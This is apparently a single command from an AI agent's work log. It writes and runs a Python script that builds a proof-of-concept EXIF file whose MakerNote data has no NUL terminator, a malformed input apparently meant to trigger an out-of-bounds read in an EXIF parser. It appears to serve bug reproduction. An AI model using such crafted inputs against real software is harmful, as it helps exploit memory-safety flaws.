message:
Running command: cd /workspace && cat > /tmp/gen_poc.py << 'EOF'
import struct

# Build a minimal EXIF file with a MakerNote entry whose data has no NUL byte
# Intel byte order

data = bytearray()

# EXIF header
data += b"Exif\x00\x00"
# Byte order
data += b"II"
# Fixed value 0x002a
data += struct.pack('<H', 0x002a)
# IFD 0 offset = 8
data += struct.pack('<I', 8)

# IFD 0 at TIFF offset 8
# number of entries = 1
data += struct.pack('<H', 1)

# Entry: MakerNote tag 0x927C
tag = 0x927C
format_ = 7  # UNDEFINED
components = 8
# data offset relative to TIFF start. TIFF start is file offset 6.
# We'll place maker note data at TIFF offset 26 (file offset 32)
data_offset = 26
data += struct.pack('<H', tag)
data += struct.pack('<H', format_)
data += struct.pack('<I', components)
data += struct.pack('<I', data_offset)

# next IFD offset = 0
data += struct.pack('<I', 0)

# pad to TIFF offset 26 (file offset 32)
while len(data) < 6 + 26:
    data += b'\x00'

# maker note data: 8 bytes of 0xFF (no NUL)
data += b'\xff' * 8

open('/workspace/poc.exif', 'wb').write(bytes(data))
print("wrote", len(data), "bytes")
EOF
python3 /tmp/gen_poc.py
